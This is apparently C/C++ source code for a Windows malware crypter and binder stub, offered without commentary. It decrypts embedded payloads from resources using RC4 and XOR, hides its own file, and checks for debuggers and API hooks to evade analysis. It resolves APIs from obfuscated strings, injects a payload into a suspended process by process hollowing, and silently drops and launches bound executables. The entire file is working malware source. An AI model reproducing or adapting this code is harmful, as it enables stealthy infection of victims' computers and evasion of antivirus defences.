#include <Windows.h>
#include <tlhelp32.h>
#include <Shlobj.h>
//#include <stdio.h>
//#include <commctrl.h>


#pragma comment(linker,"/BASE:0x400000 /FILEALIGN:0x200 /MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR /IGNORE:4078") 
#pragma pack(1)

#pragma comment (linker, "/SUBSYSTEM:WINDOWS")

char* chars_array;


bool PostojiW(WCHAR * filename)
{
return GetFileAttributesW(filename) != 0xFFFFFFFF;
}


WCHAR direkcija[MAX_PATH];

typedef int(__stdcall *ppm)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T *);
ppm xPisemMemoriju;

typedef FARPROC(__stdcall *ad)(HMODULE hModule,LPCSTR lpProcName);
ad xAdresuNadji;

typedef BOOL(__stdcall *pp)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL ,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
pp xProcesPokreni;

typedef BOOL(__stdcall *pk)(HANDLE,CONST CONTEXT *);
pk xPodesiKontekst;

typedef BOOL(__stdcall *uk)(HANDLE,LPCONTEXT);
uk xUzmiKontekst;

typedef BOOL(__stdcall *np)(HANDLE);
np xNastaviPut;

typedef int(__stdcall *mc)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T *);
mc MemorijuCitaj;

typedef HMODULE(__stdcall *dm)(LPCSTR lpModuleName);
dm DajModul;

typedef HRSRC(__stdcall *dr)( HMODULE,LPCSTR,LPCSTR);
dr DajResurs;

typedef HGLOBAL(__stdcall *qldr)(HMODULE,HRSRC);
qldr DodajResurs;

typedef DWORD(__stdcall *frle)(HMODULE,HRSRC);
frle Velicina;

typedef LPVOID(__stdcall *dete)(HANDLE,LPVOID,DWORD,DWORD,DWORD);
dete xEXLociraj;

typedef LONG (WINAPI * xunm)(HANDLE, PVOID); 
xunm MapaPuta;

typedef bool(__stdcall *nd)(DWORD,DWORD,DWORD);
nd NastaviDogadjaj;

typedef bool(__stdcall *cd)(LPDEBUG_EVENT, DWORD);
cd CekajDogadjaj;


int Rsize;
char* Slama = "";
int Rsize2;
char* Slama2 = "";

char * Key = "Sunce";

void Zapisi(int q,int g)
{
	Slama[g] = char(q);
}


void oprasiti(char p[])
{
     int len=strlen(p);
     char t;
     for(int i=(--len), j=0; i>len/2; i--, j++)
     {
          t=p[i];
          p[i]=p[j];
          p[j]=t;
     }

	 
}

void mjuadsb62qasf(int id)
{
HRSRC taraba = DajResurs(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
HGLOBAL terasa = DodajResurs(NULL, taraba);
Rsize = Velicina(NULL,taraba);
Slama = (char*)(terasa);
}

void native(int id)
{
HRSRC taraba = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
HGLOBAL terasa = LoadResource(NULL, taraba);
Rsize = SizeofResource(NULL,taraba);
Slama = (char*)(terasa);
}


void mjuadsb62qasf2(int id)
{
HRSRC taraba = DajResurs(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
HGLOBAL terasa = DodajResurs(NULL, taraba);
Rsize2 = Velicina(NULL,taraba);
Slama2 = (char*)(terasa);
}


void fufara(int id)
{
HRSRC taraba = DajResurs(NULL, MAKEINTRESOURCE(id), MAKEINTRESOURCE(13));
HGLOBAL terasa = DodajResurs(NULL, taraba);
Rsize = Velicina(NULL,taraba);
Slama = (char*)(terasa);
}

void denis(int id)
{
HRSRC taraba = DajResurs(NULL, MAKEINTRESOURCE(id), MAKEINTRESOURCE(14));
HGLOBAL terasa = DodajResurs(NULL, taraba);
Rsize = Velicina(NULL,taraba);
Slama = (char*)(terasa);
}

void clean()
{
//*********************************************

              if(Slama[strlen(Slama)-1] == 'P')
			  {
                      Slama[strlen(Slama)-1] = '\0';
			  }


       if(Slama[strlen(Slama)-1] == 'A')
	   {
           if(Slama[strlen(Slama)-2] == 'P')
		   {
                 Slama[strlen(Slama)-2] = '\0';
		   }
	   }




               if(Slama[strlen(Slama)-1] == 'D')
			   {
                    if(Slama[strlen(Slama)-2] == 'A')
					{
                      if(Slama[strlen(Slama)-3] == 'P')
					  {
                       Slama[strlen(Slama)-3] = '\0';
					  }
					}
			   }

//*********************************************
}

bool Izbaci(LPBYTE lpBuf)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION krele;
	CONTEXT ctx;
	PIMAGE_DOS_HEADER jabuka;
	PIMAGE_NT_HEADERS jabuka1;
	PIMAGE_SECTION_HEADER jabuka2;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

	denis(320);

	GetModuleFileNameW(NULL, direkcija,MAX_PATH);


	if(PostojiW(direkcija))
	{
      SetFileAttributesW(direkcija, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM );
	}
	 //*********************************************

               if(Slama[strlen(Slama)-1] == 'D')
			   {
                    if(Slama[strlen(Slama)-2] == 'A')
					{
                      if(Slama[strlen(Slama)-3] == 'P')
					  {
                       Slama[strlen(Slama)-3] = '\0';
					  }
					}
			   }

    //*********************************************
	
	jabuka = (PIMAGE_DOS_HEADER)&lpBuf[0];
	if(jabuka->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return false;
	}

	 //*********************************************

              if(Slama[strlen(Slama)-1] == 'P')
			  {
                      Slama[strlen(Slama)-1] = '\0';
			  }

    //*********************************************

	jabuka1 = (PIMAGE_NT_HEADERS)&lpBuf[jabuka->e_lfanew];
	if(jabuka1->Signature != IMAGE_NT_SIGNATURE)
	{
		return false;
	}
	
	
	//*********************************************
       if(Slama[strlen(Slama)-1] == 'A')
	   {
           if(Slama[strlen(Slama)-2] == 'P')
		   {
                 Slama[strlen(Slama)-2] = '\0';
		   }
	   }


     //*********************************************
    if(Slama[0] == '1' & Slama[1] == 'p' & Slama[2] == 'i' & Slama[3] == 'k' & Slama[4] == 'e')
	{
              Slama = "";
	}

	for(int i = 0;i<strlen(Slama);i++)
	{

    if(Slama[i] == '+')
	{
     Slama[i] = '\0';

	}
 
	}


		int q = 50000;

                for(i = 0;i < q; i++)
				{
	                    	q = q + 1;
				}

	   int size = strlen(Slama);
       WCHAR * name;
       name = new WCHAR[size];
       mbstowcs(name, Slama, size);

	if (xProcesPokreni(direkcija, name, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &krele) == TRUE)
		//AddSubOne(rand(),3);
	     ////MessageBox(NULL,"1",NULL,NULL);
		 clean();
		MapaPuta(krele.hProcess, (PVOID)jabuka1->OptionalHeader.ImageBase);
	    	////MessageBox(NULL,"2",NULL,NULL);
		//AddSubOne(rand(),3);
	    xEXLociraj(krele.hProcess, (LPVOID)jabuka1->OptionalHeader.ImageBase, jabuka1->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        clean();
		//AddSubOne(rand(),89);
		 ////MessageBox(NULL,"3",NULL,NULL);
		
		if (xPisemMemoriju(krele.hProcess, (LPVOID)jabuka1->OptionalHeader.ImageBase, &lpBuf[0], jabuka1->OptionalHeader.SizeOfHeaders, NULL) == TRUE)
		   
			for(INT i = 0; i < jabuka1->FileHeader.NumberOfSections; i++)
			{
				 ////MessageBox(NULL,"4",NULL,NULL);
				clean();
				jabuka2 = (PIMAGE_SECTION_HEADER)&lpBuf[jabuka->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
                 ////MessageBox(NULL,"5",NULL,NULL);
			    //AddSubOne(32,rand());
                //clean();
				xPisemMemoriju(krele.hProcess, (LPVOID)(jabuka1->OptionalHeader.ImageBase + jabuka2->VirtualAddress), &lpBuf[jabuka2->PointerToRawData], jabuka2->SizeOfRawData, NULL);
			    ////MessageBox(NULL,"6",NULL,NULL);
			}
			if (xUzmiKontekst(krele.hThread, &ctx) == TRUE)
			{
				////MessageBox(NULL,"7",NULL,NULL);
				//AddSubOne(rand(),14);
				ctx.Eax = jabuka1->OptionalHeader.ImageBase + jabuka1->OptionalHeader.AddressOfEntryPoint;
				////MessageBox(NULL,"8",NULL,NULL);
				//AddSubOne(rand(),25);
                clean();
				xPodesiKontekst(krele.hThread, &ctx);
				////MessageBox(NULL,"9",NULL,NULL);
				//AddSubOne(7,rand());

                 for(i = 0;i < q; i++)
				{
	                    	q = q + 1;
				}

				xNastaviPut(krele.hThread);
				////MessageBox(NULL,"10",NULL,NULL);
				//clean();
				//AddSubOne(rand(),rand());
				}
             
	return true;
}


void Crypt(char *inp, DWORD inplen, char* key, DWORD keylen)
{
    //we will consider size of sbox 256 bytes
    //(extra byte are only to prevent any mishep just in case)
    char Sbox[257], Sbox2[257];
    unsigned long i, j, t, x;

    //this unsecured key is to be used only when there is no input key from user
    static const char  OurUnSecuredKey[] = "sm2495@gmail.com";
    static const int OurKeyLen = strlen(OurUnSecuredKey);    
    char temp , k;
    i = j = k = t =  x = 0;
    temp = 0;

    //always initialize the arrays with zero
    ZeroMemory(Sbox, sizeof(Sbox));
    ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
    for(i = 0; i < 256U; i++)
    {
        Sbox[i] = (char)i;
    }

    j = 0;
    //whether user has sent any inpur key
    if(keylen)
    {
        //initialize the sbox2 with user key
        for(i = 0; i < 256U ; i++)
        {
            if(j == keylen)
            {
                j = 0;
            }
            Sbox2[i] = key[j++];
        }    
    }
    else
    {
        //initialize the sbox2 with our key
        for(i = 0; i < 256U ; i++)
        {
            if(j == OurKeyLen)
            {
                j = 0;
            }
            Sbox2[i] = OurUnSecuredKey[j++];
        }
    }

    j = 0 ; //Initialize j
    //scramble sbox1 with sbox2
    for(i = 0; i < 256; i++)
    {
        j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
        temp =  Sbox[i];                    
        Sbox[i] = Sbox[j];
        Sbox[j] =  temp;
    }

    i = j = 0;
    for(x = 0; x < inplen; x++)
    {
        //increment i
        i = (i + 1U) % 256U;
        //increment j
        j = (j + (unsigned long) Sbox[i]) % 256U;

        //Scramble SBox #1 further so encryption routine will
        //will repeat itself at great interval
        temp = Sbox[i];
        Sbox[i] = Sbox[j] ;
        Sbox[j] = temp;

        //Get ready to create pseudo random  byte for encryption key
        t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

        //get the random byte
        k = Sbox[t];

        //xor with the data and done
        inp[x] = (inp[x] ^ k);
    }    
}





void DebugSelf()
{
    HANDLE hProcess = NULL;
    DEBUG_EVENT de;
    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&de, sizeof(DEBUG_EVENT)); 

    GetStartupInfoW(&si);

    // Create the copy of ourself
    xProcesPokreni(NULL, GetCommandLineW(), NULL, NULL, FALSE,
            DEBUG_PROCESS, NULL, NULL, &si, &pi); 

    // Continue execution
    NastaviDogadjaj(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE); 

    // Wait for an event
    CekajDogadjaj(&de, INFINITE);
}

void enc() // The function that Encrypts the info on the FB buffer
{
char cipher[50];
 strcpy(cipher,Key);
for (int i = 0; i < Rsize; i++)
    Slama[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
}

void enc2() // The function that Encrypts the info on the FB buffer
{
char cipher[50];
strcpy(cipher,Key);
for (int i = 0; i < Rsize2; i++)
    Slama2[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
}

DWORD WINAPI  marlon(LPVOID args)
{ 
	
   Crypt(Slama,strlen(Slama),Key,strlen(Key));
   enc();

   return 0;

}

DWORD WINAPI run(LPVOID args)
{ 
	

   Izbaci((BYTE *)Slama);

   return 0;

}

bool Zaseda() 
{
   unsigned char bBuffer;

   MemorijuCitaj( GetCurrentProcess(), (void *) xProcesPokreni, &bBuffer, 1, 0 );
   
   if( bBuffer == 0xE9 )
   {
       return true;
   }

   return false;
}

void WT()
{
DWORD stf;
HANDLE hh = CreateFile(chars_array,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
WriteFile(hh,Slama2,Rsize2,&stf,NULL);
CloseHandle(hh);
}

DWORD WINAPI  posao(LPVOID args)
{ 


//Sleep(100);
mjuadsb62qasf(48);

clean();

for(int i = 0;i<strlen(Slama);i++)
	{

    if(Slama[i] == ':')
	{
     Slama[i] = '\0';

	}
 
	}

int time = atoi(Slama);


Sleep(time*1000);

//MessageBox(NULL,"Prosli smo Sleep!",NULL,NULL);
 
	mjuadsb62qasf(958);
	int f = 0;
	
    clean();

	chars_array = strtok(Slama, "|");
    while(chars_array)
    {
        if(chars_array[strlen(chars_array)-1] == '1')
		{
			//MessageBox(NULL,"op#1",NULL,NULL);
            chars_array[strlen(chars_array)-1] = '\0';
            mjuadsb62qasf2(960+f);
			Crypt(Slama2,strlen(Slama2),Key,strlen(Key));
            enc2();
            WT();
			//MessageBox(NULL,Slama2,NULL,NULL);
			STARTUPINFOW siStartupInfo; 
            PROCESS_INFORMATION piProcessInfo; 
            memset(&siStartupInfo, 0, sizeof(siStartupInfo)); 
            memset(&piProcessInfo, 0, sizeof(piProcessInfo)); 
            siStartupInfo.cb = sizeof(siStartupInfo); 
			int size = strlen(chars_array);
            WCHAR * name;
            name = new WCHAR[size];
            mbstowcs(name, chars_array, size);
            name[size] = '\0';
			xProcesPokreni(NULL, name, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &siStartupInfo, &piProcessInfo);
			f = f + 1;
   
		}
		else
		{
            //MessageBox(NULL,"op#2",NULL,NULL);
            chars_array[strlen(chars_array)-1] = '\0';
			mjuadsb62qasf2(960+f);
			Crypt(Slama2,strlen(Slama2),Key,strlen(Key));
            enc2();
			WT();
			f = f + 1;

		}

        chars_array = strtok(NULL, "|");
    }         
    
//MessageBox(NULL,"Prosli smo Binder!",NULL,NULL);
if(Zaseda() == true)
    {
		ExitProcess(0);
	}
    
//Sleep(100);
//MessageBox(NULL,NULL,"1",NULL);
mjuadsb62qasf(286);
marlon(NULL);
//MessageBox(NULL,NULL,"2",NULL);

run(NULL);

//MessageBox(NULL,NULL,"3",NULL);

			  
return 0;

}



void decrypt(char pike[])
{
oprasiti(pike);
     for(int i = 0;i<strlen(pike);i++)
	 {

       pike[i] = char(int(int( pike[i])-1));

	 }

}

void krozprozor()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,0);
    DWORD res = -1;
    MODULEENTRY32 mod;
    if(!Module32First(hSnapshot,&mod)) 
	{
        ExitProcess(0);
     }
     CloseHandle(hSnapshot);
}

void Spavanje()
{
HMODULE jaje,mik;
int i = 0;


native(200);
Slama[269] = '\0';

//MessageBox(NULL,Slama,NULL,NULL);

decrypt(Slama);

//MessageBox(NULL,Slama,NULL,NULL);

char* chars_array = strtok(Slama, "|");

    while(chars_array)
    {
        i = i + 1;
        
		if( i == 1)
		{
            jaje = LoadLibraryA(chars_array);
            
		}

        if( i == 2)
		{
            mik = LoadLibraryA(chars_array);
            
		}
		if( i == 3)
		{
            xAdresuNadji = (ad)GetProcAddress(jaje,chars_array);
            
		}
		if( i == 4)
		{
            DajModul = (dm)xAdresuNadji(jaje,  chars_array);
            
		}
		if( i == 5)
		{
            xPisemMemoriju = (ppm)xAdresuNadji(jaje,  chars_array);
            
		}
		if( i == 6)
		{
            xProcesPokreni = (pp)xAdresuNadji(jaje,  chars_array);
            
		}
		if( i == 7)
		{
            xPodesiKontekst = (pk)xAdresuNadji(jaje,  chars_array);
            
		}
		if( i == 8)
		{
            xUzmiKontekst = (uk)xAdresuNadji(jaje,  chars_array);
            
		}
		if( i == 9)
		{
            xNastaviPut = (np)xAdresuNadji(jaje,  chars_array);
            
		}
        	if( i == 10)
		{
            DajResurs =     (dr)xAdresuNadji(jaje,  chars_array);
            
		}

				if( i == 11)
		{ 
            DodajResurs = (qldr)xAdresuNadji(jaje,  chars_array);
            
		}

				if( i == 12)
		{
            Velicina = (frle)xAdresuNadji(jaje,  chars_array);
            
		}
				if( i == 13)
		{ 
            xEXLociraj = (dete)xAdresuNadji(jaje,  chars_array);
            
		}
			     if( i == 14)
		{
            MapaPuta = (xunm)xAdresuNadji(mik,chars_array);
            
		}

        	     if( i == 15)
		{
            NastaviDogadjaj = (nd)xAdresuNadji(jaje,chars_array);
            
		}

				 if( i == 16)
		{
            CekajDogadjaj = (cd)xAdresuNadji(jaje,chars_array);
            
		}

				  if( i == 17)
		{

            MemorijuCitaj = (mc)xAdresuNadji(jaje,chars_array);
            
		}

        chars_array = strtok(NULL, "|");
    }

}


DWORD WINAPI padanje(LPVOID args)
{ 

    DebugSelf();

	return 0;
} 



int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{

	int i,q = 60000;
	bool joj;

	OutputDebugStringA( "%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s"
                "%s%s%s%s%s%s%s%s%s%s%s%s%s");

	Spavanje();
        
	DebugSelf();

	for( i = 0;i < q; i++)
	{
		q= q + 1;
	}
   
	krozprozor();

	padanje(NULL);

	FindClose(0);


	__asm {
     mov eax, fs:[30h]
     mov al, [eax + 2h]
     mov joj, al
	}

     if (joj)
      {
         ExitProcess(0);
      }

	posao(NULL);

return 0;

}